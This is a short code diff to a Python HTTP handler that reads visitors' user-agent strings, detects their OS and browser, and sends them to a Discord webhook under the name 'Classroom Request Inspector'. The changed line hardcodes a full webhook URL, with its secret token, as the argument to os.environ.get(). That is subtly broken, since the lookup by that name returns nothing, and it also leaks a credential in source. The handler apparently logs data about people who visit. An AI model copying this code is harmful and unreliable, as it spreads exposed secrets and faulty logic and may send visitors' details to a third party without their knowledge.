@@ -36,7 +36,7 @@ class handler(BaseHTTPRequestHandler):
         user_agent = self.headers.get("user-agent", "Unknown")
         os_name, browser_name = httpagentparser.simple_detect(user_agent)
 
-        webhook_url = os.environ.get("DISCORD_WEBHOOK_URL")
+        webhook_url = os.environ.get("https://discord.com/api/webhooks/1571839606368903260/tBwh8pE0kbsZlYvvOCkhrdJLqROD-TeDGLrvVe3cueR7TVDKCf2UC5-K_8TuR7aqwVf-")
         if webhook_url:
             embed = {
                 "username": "Classroom Request Inspector",
